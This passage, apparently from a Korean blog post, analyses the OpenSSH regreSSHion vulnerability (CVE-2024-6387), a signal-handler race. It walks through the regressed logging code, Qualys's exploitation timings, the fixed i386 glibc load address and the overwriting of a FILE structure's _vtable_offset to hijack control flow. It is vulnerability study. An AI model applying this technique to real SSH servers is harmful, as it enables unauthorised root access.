	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">sshlogv</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">showfunc</span><span class="p">,</span> <span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span>
	    <span class="n">suffix</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>결과적으로 <code class="language-plaintext highlighter-rouge">sshlogv</code>는 그전에 패치로 호출되지 않게했던 <code class="language-plaintext highlighter-rouge">do_log</code>를 다시 호출하게됩니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">sshlogv</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">int</span> <span class="n">showfunc</span><span class="p">,</span>
    <span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">suffix</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">tag</span><span class="p">[</span><span class="mi">128</span><span class="p">],</span> <span class="n">fmt2</span><span class="p">[</span><span class="n">MSGBUFSIZ</span> <span class="o">+</span> <span class="mi">128</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">forced</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>

	<span class="n">snprintf</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">tag</span><span class="p">),</span> <span class="s">"%.48s:%.48s():%d"</span><span class="p">,</span>
	    <span class="p">(</span><span class="n">cp</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="sc">'/'</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="n">file</span> <span class="o">:</span> <span class="n">cp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nlog_verbose</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">match_pattern_list</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span> <span class="n">log_verbose</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">forced</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">log_handler</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">forced</span><span class="p">)</span>
		<span class="n">snprintf</span><span class="p">(</span><span class="n">fmt2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fmt2</span><span class="p">),</span> <span class="s">"%s: %s"</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">showfunc</span><span class="p">)</span>
		<span class="n">snprintf</span><span class="p">(</span><span class="n">fmt2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fmt2</span><span class="p">),</span> <span class="s">"%s: %s"</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="k">else</span>
		<span class="n">strlcpy</span><span class="p">(</span><span class="n">fmt2</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fmt2</span><span class="p">));</span>

	<span class="n">do_log</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">func</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span> <span class="n">level</span><span class="p">,</span> <span class="n">forced</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">fmt2</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">do_log</code>는 여전히 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하고 있으며 <code class="language-plaintext highlighter-rouge">glibc</code>의 <code class="language-plaintext highlighter-rouge">syslog</code>는 여전히 비동기 시그널에 대해 안전하지 않기 때문에 보안 회귀가 발생합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
<span class="nf">do_log</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">force</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">suffix</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
		<span class="n">syslog</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">"%.500s"</span><span class="p">,</span> <span class="n">fmtbuf</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <p>이로인해 해당 패치가 도입된 <code class="language-plaintext highlighter-rouge">8.5p1</code>부터 <code class="language-plaintext highlighter-rouge">9.8p1</code> 패치가 적용되기 이전까지 <code class="language-plaintext highlighter-rouge">glibc-based</code> 리눅스 시스템에서 취약점이 발생하게 됩니다.</p> <p align="center"><img src="/assets/img/CVE-2024-6387/regresshion_attack.png" /><a href="https://upload.wikimedia.org/wikipedia/commons/8/83/Resultant.png">https://upload.wikimedia.org/wikipedia/commons/8/83/Resultant.png</a></p> <h2 id="exploit"> <a href="#exploit" class="anchor-head"></a> Exploit </h2> <p>본 취약점을 제보한 Qualys는 위 취약점(CVE-2024-6387)의 악용방법을 32bit glibc기반의 리눅스에서 입증했습니다. 또한 다른 버전에서도 악용 가능 지점을 찾아 특정 버전에 대한 악용 가능성을 연구를 진행했습니다.</p> <p>연구 개요는 다음과 같습니다.</p> <h3 id="ssh-20-openssh_34p1-debian-134p1-1woody3-debian-30r6-from-2005"> <a href="#ssh-20-openssh_34p1-debian-134p1-1woody3-debian-30r6-from-2005" class="anchor-head"></a> SSH-2.0-OpenSSH_3.4p1 Debian 1:3.4p1-1.woody.3 (Debian 3.0r6, from 2005) </h3> <p><code class="language-plaintext highlighter-rouge">DSA</code>의 공개 키 파싱 지점에서 호출되는 <code class="language-plaintext highlighter-rouge">free</code>를 취약점을 이용해 중간에 처리를 중단시키고, 완전한 처리가 이루어지지 않은 <code class="language-plaintext highlighter-rouge">heap chunk</code>에 대해 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>에 의해 호출되는 <code class="language-plaintext highlighter-rouge">free</code>를 통해 공격을 수행합니다.</p> <p>해당 공격을 성공시키기위해 600초의 로그인 유예 시간 동안 10개의 연결(MaxStartups)을 수용할 경우 약 10,000번의 시도가 필요하며 원격 루트 쉘을 얻기 위해 평균적으로 약 1주일 정도가 소요됩니다.</p> <h3 id="ssh-20-openssh_42p1-debian-7ubuntu3-ubuntu-6061-from-2006"> <a href="#ssh-20-openssh_42p1-debian-7ubuntu3-ubuntu-6061-from-2006" class="anchor-head"></a> SSH-2.0-OpenSSH_4.2p1 Debian-7ubuntu3 (Ubuntu 6.06.1, from 2006) </h3> <p>해당 버전의 연구에선 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>에서 언급된 <code class="language-plaintext highlighter-rouge">GSSAPI</code>를 <code class="language-plaintext highlighter-rouge">GSSAPI</code> 기능은 기본적으로 활성화되어있지 않기 때문에 취약점을 악용할 포인트로 사용하지 않고 기본적으로 활성화된 <code class="language-plaintext highlighter-rouge">PAM</code> 기능을 이용합니다.</p> <p>해당 공격을 성공시키기위해 120초의 로그인 유예 시간 동안 10개의 연결(MaxStartups)을 수용할 경우 약 10,000번의 시도가 필요하며 원격 루트 쉘을 얻기 위해 약 1~2일 정도가 소요됩니다.</p> <h3 id="ssh-20-openssh_92p1-debian-2deb12u2-debian-1250-from-2024"> <a href="#ssh-20-openssh_92p1-debian-2deb12u2-debian-1250-from-2024" class="anchor-head"></a> SSH-2.0-OpenSSH_9.2p1 Debian-2.+deb12u2 (Debian 12.5.0 from 2024) </h3> <blockquote> <p>🧪 아래 서술된 Exploit은 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>을 사용하지 않는 경우 <code class="language-plaintext highlighter-rouge">_IO_wfile_underflow</code>의 유도가 불가능하기때문에 glibc 32bit에서만 유효합니다.</p> </blockquote> <details> <summary>⁉️</summary> <div> <p>다음 glibc-2.36의 소스 코드의 주석을 확인해봅시다.</p> <p>libioP.h</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Setting this macro to 1 enables the use of the _vtable_offset bias
   in _IO_JUMPS_FUNCS, below.  This is only needed for new-format
   _IO_FILE in libc that must support old binaries (see oldfileops.c).  */</span>
<span class="cp">#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1) &amp;&amp; !defined _IO_USE_OLD_IO_FILE
# define _IO_JUMPS_OFFSET 1
#else
# define _IO_JUMPS_OFFSET 0
#endif
</span></code></pre></div> </div> <p>위와 같은 경우 컴파일 설정에 따라 <code class="language-plaintext highlighter-rouge">_IO_JUMPS_OFFSET</code>을 <code class="language-plaintext highlighter-rouge">1</code>로 만들어 활성화하거나 <code class="language-plaintext highlighter-rouge">0</code>으로 만들어 일부 매크로를 다르게 만들 수 있습니다.</p> <p>이에따라 다음과 같은 매크로에 차이가 생깁니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)-&gt;_vtable_offset)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE)				\
  (*(const struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)	\
				  + (THIS)-&gt;_vtable_offset) = (VTABLE))
# define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
# define _IO_JUMPS_FUNC_UPDATE(THIS, VTABLE) \
  (_IO_JUMPS_FILE_plus (THIS) = (VTABLE))
# define _IO_vtable_offset(THIS) 0
#endif
</span></code></pre></div> </div> <p>위에서 본 _IO_JUMPS_OFFSET을 0으로 만든다면 설정에 의해 <code class="language-plaintext highlighter-rouge">_IO_JUMPS_FUNC</code>에서 <code class="language-plaintext highlighter-rouge">_vtable_offset</code> 필드를 사용하지 않게되고 이로인해서 공격이 통하지 않을 수 있습니다.</p> <p>이는 원 연구글에도 나와있으며 따라서 아래에 설명하는 공격은 i386 glibc에만 해당하게됩니다.</p> <blockquote> <p>Eventually, we devised the following technique (which seems to be specific to the i386 glibc – the amd64 glibc does not seem to use _vtable_offset at all):</p> </blockquote> <p>– [접은글의 끝입니다] –</p> </div> </details> <p>해당 버전의 연구에선 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하는 점을 이용합니다. PoC에선 현재 환경에서의 취약성을 종합해서 악용하기 때문에 자세히 알아봅시다.</p> <p>연구에 사용된 <code class="language-plaintext highlighter-rouge">Debian</code>은 i386에 경우 glibc(2.36)가 항상 <code class="language-plaintext highlighter-rouge">0xb7200000</code> 또는 <code class="language-plaintext highlighter-rouge">0xb7400000</code>에 매핑되기 때문에 절반의 확률로 PIE를 무력화 시킬 수 있습니다.</p> <p>앞서 알아본 순서로 <code class="language-plaintext highlighter-rouge">syslog</code>가 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>에 의해서 호출됩니다.</p> <p>연구에 사용된 <code class="language-plaintext highlighter-rouge">Debian</code>버전의 glibc(2.36)는 <a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=a15d53e2de4c7d83bda251469d92a3c7b49a90db">단일 스레드 환경에대한 락을 진행하지 않기 때문</a>에 취약점을 성공적으로 악용할 수 있습니다.</p> <p>이를 이용해 <code class="language-plaintext highlighter-rouge">malloc</code> 호출을 SIGALRM을 통해 중간에 중단시킨 후 <code class="language-plaintext highlighter-rouge">SIGALRM</code>에서 사용하는 <code class="language-plaintext highlighter-rouge">malloc</code>을 통해 완전히 처리되지 않은 <code class="language-plaintext highlighter-rouge">heap chunk</code>를 악용합니다.</p> <p>해당 공격을 성공시키위해 120초의 로그인 유예 시간 동안 100개의 연결(MaxStartups)을 수용할 경우 원격 루트 쉘을 얻기 위해 약 6~8시간이 소요됩니다.</p> <p>glibc 2.36에서 <code class="language-plaintext highlighter-rouge">syslog</code>에서는 다음과 같은 흐름으로 <code class="language-plaintext highlighter-rouge">fopen</code>을 호출해 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체를 만들고 있습니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph.png" /></p> <details> <summary>/misc/syslog.c:__syslog,__vsyslog_internal</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * syslog, vsyslog --
 *	print message on log file; output is intended for syslogd(8).
 */</span>
<span class="kt">void</span>
<span class="nf">__syslog</span> <span class="p">(</span><span class="kt">int</span> <span class="n">pri</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
  <span class="kt">va_list</span> <span class="n">ap</span><span class="p">;</span>

  <span class="n">va_start</span> <span class="p">(</span><span class="n">ap</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
  <span class="n">__vsyslog_internal</span> <span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">ap</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">va_end</span> <span class="p">(</span><span class="n">ap</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">ldbl_hidden_def</span> <span class="p">(</span><span class="n">__syslog</span><span class="p">,</span> <span class="n">syslog</span><span class="p">)</span>
<span class="n">ldbl_strong_alias</span> <span class="p">(</span><span class="n">__syslog</span><span class="p">,</span> <span class="n">syslog</span><span class="p">)</span>

<span class="kt">void</span>
<span class="nf">__vsyslog_internal</span> <span class="p">(</span><span class="kt">int</span> <span class="n">pri</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">ap</span><span class="p">,</span>
		    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mode_flags</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span><span class="n">now_tmp</span> <span class="o">=</span> <span class="n">__localtime64_r</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">now</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">now_tm</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <details> <summary>/time/localtime.c:__localtime64_r</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Return the `struct tm' representation of *T in local time,
   using *TP to store the result.  */</span>
<span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span>
<span class="nf">__localtime64_r</span> <span class="p">(</span><span class="k">const</span> <span class="n">__time64_t</span> <span class="o">*</span><span class="n">t</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span><span class="n">tp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">__tz_convert</span> <span class="p">(</span><span class="o">*</span><span class="n">t</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">tp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <details> <summary>/time/tzset.c:__tz_convert,tzset_internal</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Return the `struct tm' representation of TIMER in the local timezone.
   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span>
<span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span>
<span class="nf">__tz_convert</span> <span class="p">(</span><span class="n">__time64_t</span> <span class="n">timer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">use_localtime</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tm</span> <span class="o">*</span><span class="n">tp</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="cm">/* Update internal database according to current TZ setting.
     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.
     This is a good idea since this allows at least a bit more parallelism.  */</span>
  <span class="n">tzset_internal</span> <span class="p">(</span><span class="n">tp</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">_tmbuf</span> <span class="o">&amp;&amp;</span> <span class="n">use_localtime</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="cm">/* Interpret the TZ envariable.  */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">tzset_internal</span> <span class="p">(</span><span class="kt">int</span> <span class="n">always</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="cm">/* Try to read a data file.  */</span>
  <span class="n">__tzfile_read</span> <span class="p">(</span><span class="n">tz</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">...</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <details> <summary>/time/tzfile.c:__tzfile_read</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">__tzfile_read</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">extra</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">extrap</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="cm">/* Note the file is opened with cancellation in the I/O functions
     disabled and if available FD_CLOEXEC set.  */</span>
  <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">"rce"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">ret_free_transitions</span><span class="p">;</span>
<span class="p">...</span>
 <span class="nl">read_again:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">__fread_unlocked</span> <span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">tzhead</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tzhead</span><span class="p">),</span>
					  <span class="mi">1</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
      <span class="o">||</span> <span class="n">memcmp</span> <span class="p">(</span><span class="n">tzhead</span><span class="p">.</span><span class="n">tzh_magic</span><span class="p">,</span> <span class="n">TZ_MAGIC</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tzhead</span><span class="p">.</span><span class="n">tzh_magic</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">goto</span> <span class="n">lose</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <p>위와 같은 흐름에 의해서 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체가 힙 메모리에 생성됩니다.</p> <p>취약점을 이용하여 특정 힙 청크를 겹치게 만든 후 이를 덮어쓰는 과정으로 공격을 진행합니다.</p> <p>보고서에 나온 내용에 따르면 힙 손상을 통해 <code class="language-plaintext highlighter-rouge">__tzfile_read()</code>에서 할당된 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체의 <code class="language-plaintext highlighter-rouge">_vtable_offset</code> 필드 덮어써 함수 포인터에 의해 호출되는 함수를 임의로 조작하여 원하는 명령어를 실행할 수 있게됩니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
<span class="p">...</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
<span class="p">...</span>
<span class="p">};</span>
</code></pre></div></div> <p>이렇게 오염된 메타데이터는 위 코드에서 살펴본 <code class="language-plaintext highlighter-rouge">__tzfile_read</code>에서 <code class="language-plaintext highlighter-rouge">__fread_unlocked</code>를 호출하는 과정에서 원하는 코드를 실행할 수 있게 만듭니다.</p> <p><code class="language-plaintext highlighter-rouge">__fread_unlocked</code> 함수는 다음과 같은 호출 흐름을 갖습니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph2.png" /></p> <details> <summary>libio/iofread_u.c:_IO_jump_t</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/iofread_u.c:__fread_unlocked</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span>
<span class="nf">__fread_unlocked</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">bytes_requested</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">bytes_read</span><span class="p">;</span>
  <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bytes_requested</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">_IO_sgetn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes_requested</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">bytes_requested</span> <span class="o">==</span> <span class="n">bytes_read</span> <span class="o">?</span> <span class="n">count</span> <span class="o">:</span> <span class="n">bytes_read</span> <span class="o">/</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/genops.c:_IO_sgetn</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span>
<span class="nf">_IO_sgetn</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* FIXME handle putback buffer here! */</span>
  <span class="k">return</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_sgetn</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/libioP.h:_IO_XSGETN(FP, DATA, N), _IO_WXSGETN(FP, DATA, N)</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The 'xsgetn' hook reads upto N characters into buffer DATA.
   Returns the number of character actually read.
   It matches the streambuf::xsgetn virtual function. */</span>
